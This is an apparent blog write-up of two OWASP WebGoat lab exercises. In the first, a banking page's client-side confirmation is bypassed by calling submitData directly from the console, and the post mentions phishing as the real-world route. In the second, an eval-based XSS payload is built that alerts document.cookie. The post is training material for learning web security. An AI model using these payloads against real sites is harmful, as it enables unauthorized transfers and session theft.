---
layout: post
title:  "OWASP BWA WebGoat Challenge Part 3 Continued (Continued)"
date:   2017-01-24 17:00:00 -0500
categories: webgoat
---
# AJAX Security Part 8: Silent Transaction Attacks
Instructions:
* This is a sample internet banking application - money transfer page.
* It shows below your balance, the account you are transferring to and amount you will transfer.
* The application uses AJAX to submit the transaction after doing some basic client side validations.
* Your goal is to try to bypass the user's authorization and silently execute the transaction.

Aha, client side validations. Sounds like we can mess with it, or at the very least read it and look for some exploitability. Nice! Let's take a look at the source.

In the HTML, we see the following code in the confirmation form:

```
<input onclick="processData();" id="confirm" value="Confirm" name="confirm" type="BUTTON">
```

Alright so there is a third-party function ```processData()``` being called when we want to send the request. Lets take a look at that function.

```
function processData(){
	var accountNo = document.getElementById('newAccount').value;
	var amount = document.getElementById('amount').value;
	if ( accountNo == ''){
		alert('Please enter a valid account number to transfer to.')
		return;
	}
	else if ( amount == ''){
		alert('Please enter a valid amount to transfer.')
		return;
	}
	 document.getElementById('confirm').value  = 'Transferring'
	submitData(accountNo, amount);
	document.getElementById('confirm').value  = 'Confirm'
	balanceValue = parseFloat(balanceValue) - parseFloat(amount);
	balanceValue = balanceValue.toFixed(2);
	document.getElementById('balanceID').innerHTML = balanceValue + '$';
}
```

Let's break it down. ```processData``` works by pulling the information for the account the money is being transferred to, and the amount of money to be transferred from the elements filled out on the page (as long as they are filled with some data). It then does a check to make sure you cannot transfer more money than you have in the account. If the transaction passes those checks, it calls another function ```submitData``` and passes it the destination account and the amount to transfer. Then ```processData``` continues on, adjusting the sender account's balance for the amount transferred.

So there are a lot of checks in ```processData``` to prevent any transfers that the user does not want to happen. Not to mention the initial confirmation button in the HTML that fires the function off. Its main job is to interact with the sender and update data about their balance and transactions. Kind of the opposite of "silent". Let's look at ```submitData```, the method that actually performs the transactions.

```
function submitData(accountNo, balance) {
	var url = 'attack?Screen=68&menu=400&from=ajax&newAccount='+ accountNo+ '&amount=' + balance +'&confirm=' + document.getElementById('confirm').value; 
	if (typeof XMLHttpRequest != 'undefined') {
		req = new XMLHttpRequest();
	} 
	else if (window.ActiveXObject) {
		req = new ActiveXObject('Microsoft.XMLHTTP');
	}
	req.open('GET', url, true);
	req.onreadystatechange = callback;
	req.send(null);
}
```

Hmm...not a confirmation, prompt, or check in sight! Well, let's see if we can call ```submitData``` directly from the console and bypass any user initiation or confirmation:

```
$submitData('hackeracct', 1000000)
```

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_3_continued_continued/silent-transaction.jpg">

Free money!!!

The real security implication here is that the ```submitData``` function actually sends a URL-formatted request to the server to perform this transaction:

```
GET /WebGoat/attack?Screen=68&menu=400&from=ajax&newAccount=hackeracct&amount=1000000&confirm=Confirm HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=68&menu=400
Cookie: JSESSIONID=C1702A9FE913D04E2F177203213F9149; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
```

So a legitimate attack might look more like a phishing campaign to members of WebGoat bank that asks them to update some account information. And then...

# AJAX Security Part 9: Dangerous Use of Eval
Instructions:
* For this exercise, your mission is to come up with some input containing a script. You have to try to get this page to reflect that input back to your browser, which will execute the script. In order to pass this lesson, you must 'alert()' document.cookie.

Alright, so we're started off with a shopping cart and some credit card info

<img src="{{  site.baseurl }}/images/2017-01-24-webgoat_part_3_continued_continued/eval-1.jpg">

When we go to purchase, the server responds with an alert that tells us whether the request went through or not. Enter our exploitable vector.

<img src="{{  site.baseurl }}/images/2017-01-24-webgoat_part_3_continued_continued/eval-2.jpg">

Initially, without really thinking I tried a bunch of naive XSS inserts that didn't pop. Then I realized that I was trying to pop an alert inside of an alert, which didn't make much sense. So let's think about this more logically. If we enter an incorrect PIN, the document generates an alert that looks something like this:

```
alert('Whoops: You entered an incorrect access code of "' + document.form.field1 + '"')
```

Maybe we can break out of the alert and append another? Similar to the mechanism for HTTP Response Splitting. Let's give it a shot with:

```
fail"');alert(document.cookie
```

This almost worked, but we received:

```
alert('Whoops: You entered an incorrect access code of "fail");alert(document.cookie");
```

Aha, right we forgot about the closed string. Let's try to tack on another alert on the end?

```
fail"');alert(document.cookie);alert('"filler
```

Now everything is properly escaped, and we get three alerts, of which the second is:

<img src="{{  site.baseurl }}/images/2017-01-24-webgoat_part_3_continued_continued/eval-3.jpg">

Success! Definitely not too subtle with three alerts, but we pop the cookie!